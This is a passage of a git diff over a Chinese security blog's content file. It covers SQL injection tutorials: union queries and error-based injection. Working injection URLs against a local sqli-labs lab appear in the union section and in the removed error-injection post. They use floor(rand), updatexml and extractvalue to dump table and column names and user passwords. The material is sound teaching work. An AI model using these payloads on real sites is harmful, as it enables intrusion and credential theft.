     <content><![CDATA[<h2 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h2><h3 id="union介绍"><a href="#union介绍" class="headerlink" title="union介绍"></a>union介绍</h3><p>SQL UNION 操作符<br>用于合并两个或多个SELECT语句的结果集。<br>注意：<br>SELECT语句必须拥有<strong>相同数量</strong>的列。<br>列也必须拥有<strong>相似的数据类型</strong>。<br>每条SELECT语句中列的<strong>顺序必须相同</strong>。  </p>
@@ -11177,47 +11221,6 @@ http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(tab
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+
 
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
-</code></pre>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
-    <url>/post/4239639054.html</url>
-    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
-<pre><code>if($row)
-{
-    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
-}
-else
-{
-    print_r(mysql_error());
-}
-</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
-<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
-<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
-select ectractvalue(1,concat(0x7e,(select user()),0x7e));
-select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
-
-报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
-http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
 </code></pre>]]></content>
       <categories>
         <category>web安全</category>
